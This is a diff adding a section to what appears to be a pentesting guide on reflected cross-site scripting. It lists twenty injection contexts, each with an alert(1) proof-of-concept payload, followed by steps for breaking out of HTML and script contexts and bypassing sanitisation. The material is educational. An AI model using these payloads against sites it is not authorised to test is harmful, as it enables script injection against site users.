@@ -89,3 +89,56 @@ _**Escape the escape**_
 
 <figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
 
+## Reflected XSS Possible Cases&#x20;
+
+1. **URL Query Parameters (GET)**: Input from `?param=value` echoed unsanitized.\
+   &#xNAN;_&#x45;xample_: `search.php?q=<script>alert(1)</script>`
+2. **HTTP Request Body (POST Data)**: Form data reflected without escaping.\
+   &#xNAN;_&#x45;xample_: POST `message=<script>alert(1)</script>` to form handler.
+3. **HTTP Headers**: Headers like User-Agent echoed directly.\
+   &#xNAN;_&#x45;xample_: Set `User-Agent: <script>alert(1)</script>` via proxy.
+4. **Cookies**: Cookie values displayed or used in output.\
+   &#xNAN;_&#x45;xample_: `?setcookie=<script>alert(1)</script>` then view page.
+5. **Error Pages (404/500)**: URI or error details reflected in messages.\
+   &#xNAN;_&#x45;xample_: `nonexistent.php?q=<script>alert(1)</script>`
+6. **Redirect/Next URLs**: Params in `Location` or meta refresh.\
+   &#xNAN;_&#x45;xample_: `redirect.php?next=javascript:alert(1)`
+7. **Filenames/Uploads (Simulated)**: Filename params echoed as text.\
+   &#xNAN;_&#x45;xample_: `upload.php?file=<script>alert(1)</script>`
+8. **Text Between Tags**: Input inside `<p>` or `<div>` allowing tag injection.\
+   &#xNAN;_&#x45;xample_: `<img src=x onerror=alert(1)>` in text field.
+9. **HTML Attributes (Unquoted)**: In unquoted attrs like `value=userinput`.\
+   &#xNAN;_&#x45;xample_: `foo" onfocus=alert(1)`
+10. **HTML Attributes (Single/Double Quoted)**: In quoted attrs like `value="userinput"`.\
+    &#xNAN;_&#x45;xample_: `" onfocus=alert(1)" x="` (for double quotes).
+11. **Event Handlers**: In `on*` attrs like `onclick=userinput`.\
+    &#xNAN;_&#x45;xample_: `alert(1)` in onclick field, then trigger event.
+12. **URLs in Attributes**: In `href`/`src` allowing `javascript:`.\
+    &#xNAN;_&#x45;xample_: `javascript:alert(1)` in link href.
+13. **Inside Script Strings**: In JS like `var x = "userinput";`.\
+    &#xNAN;_&#x45;xample_: `"; alert(1); //`
+14. **Script Tag Termination**: Breaking out of `<script>` to inject HTML.\
+    &#xNAN;_&#x45;xample_: `'; </script><img src=x onerror=alert(1)>`
+15. **Inline HTML (No Tag Breaking, Events Only)**: Escaped text but events injectable.\
+    &#xNAN;_&#x45;xample_: `' onmouseover=alert(1)//` in input attr.
+16. **Escaped JS Injection**: Backslash-escaped strings (e.g., addslashes).\
+    &#xNAN;_&#x45;xample_: `\\"; alert(1); //` to escape the escape.
+17. **HTTP Method Reflection**: Echoing `$_SERVER['REQUEST_METHOD']`.\
+    &#xNAN;_&#x45;xample_: Tamper to POST, but payload in related param like `<script>alert(1)</script>`.
+18. **Path/URI Segments**: Reflecting `$_SERVER['PATH_INFO']` or routes.\
+    &#xNAN;_&#x45;xample_: `/page/<script>alert(1)</script>` if routed.
+19. **JSON Responses**: Unsanitized input in JSON strings.\
+    &#xNAN;_&#x45;xample_: `{"data": "<script>alert(1)</script>"}` → `"}; alert(1); //`
+20. **DOM-Based (Client-Side Reflection)**: JS using `location.search` unsafely.\
+    &#xNAN;_&#x45;xample_: `document.write(location.search)` with `?q=<script>alert(1)</script>`.
+
+## Ultimate Hint
+
+The main hint for finding XSS is **reflections** — check where your input is echoed back. It doesn't matter which backend language the developer used (Node.js, PHP, or anything else): ultimately the server returns HTML (from templates, PHP files, etc.). Focus on how the input is rendered and whether it can be escaped. Developers may have put defenses in place (sanitization, validation, encoding), so you need to test how those are implemented and bypassed.
+
+Steps to check for XSS:
+
+1. Identify where your input is reflected — cookies, headers, URL path/parameters, POST data, or any of the reflection cases in the lab.
+2. Probe by injecting characters used in JavaScript/HTML (`<`, `>`, `"`, `'`, `/`, `)`, `;`, etc.).
+3. Try to break out of the surrounding context: if you’re inside a tag, attempt attribute-based attacks; if you’re inside a script/string, try to break the string or script context.
+4. Use context-appropriate payloads — there is no single “master” payload that works everywhere. Learn to read the context and craft payloads accordingly.
